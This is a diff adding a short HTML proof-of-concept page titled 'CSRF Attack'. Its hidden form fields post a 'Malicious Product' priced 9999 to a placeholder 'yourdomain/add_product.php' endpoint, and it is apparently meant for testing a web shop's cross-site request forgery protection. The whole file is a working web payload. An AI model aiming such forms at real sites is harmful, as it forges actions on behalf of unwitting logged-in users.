@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack Form</h1>
+    <form action="http://yourdomain/add_product.php" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="name" value="Malicious Product">
+        <input type="hidden" name="description" value="This is a malicious product added via CSRF.">
+        <input type="hidden" name="price" value="9999">
+        <input type="hidden" name="image" value="malicious_image.jpg">
+        <input type="submit" value="Submit CSRF Attack">
+    </form>
+</body>
+</html>
